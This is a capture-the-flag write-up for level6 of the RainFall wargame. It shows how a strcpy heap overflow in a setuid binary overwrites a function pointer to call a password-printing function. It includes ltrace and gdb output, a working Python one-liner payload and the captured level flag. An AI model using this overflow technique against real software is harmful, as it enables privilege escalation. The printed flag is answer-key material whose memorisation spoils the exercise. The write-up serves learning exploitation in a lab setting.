level6
======

*	We spawn with a [level6](src/level6) executable
	```console
	level6@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
	level6@RainFall:~$ ./level6 
	Segmentation fault (core dumped)
	level6@RainFall:~$ ./level6 test
	Nope
	```
*	Let's look at the [code](src/level6.c):
	- `main` takes a string as argument and then:	
		- `malloc dest[64]`
		- `malloc ppcVar1[4]`
		- store address of `m` in `ppcVar1`
		- `strcpy()` input into `dest`
		- calls `(**ppcVar1)()`
	- `m` just `puts("Nope")`
	- `n` cat the password of the next level

	So this seems to be a new type of issue since we have no `gets` nor `printf` here.
*	Since `m` is called through `ppcVar1`, our main goal should be to replace the address to `n`. We might exploit `strcpy()` which does no memory bound checking.
*	Using `ltrace` allow us to check that `dest` and `ppcVar1` are contiguously allocated on the heap or else we wouldn't be able to overflow it the right way.
	```console
	level6@RainFall:~$ ltrace ./level6 
	[...]
	malloc(64)         = 0x0804a008
	malloc(4)          = 0x0804a050
	```
	They do go one after the other and have a `0x48(HEX)` -> `72(DEC)` bytes difference [64 + 4 + address(4) = 72]
*	Now we need the address of `n`
	```gdb 
	(gdb) x n 
	0x8048454 <n>:  0x83e58955
	```
	little endian -> `\x54\x84\x04\x08`
*	Let's finish this exercice:
	```console
	level6@RainFall:~$ ./level6 $(python -c 'print("a" * 72 + "\x54\x84\x04\x08")')
	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
	```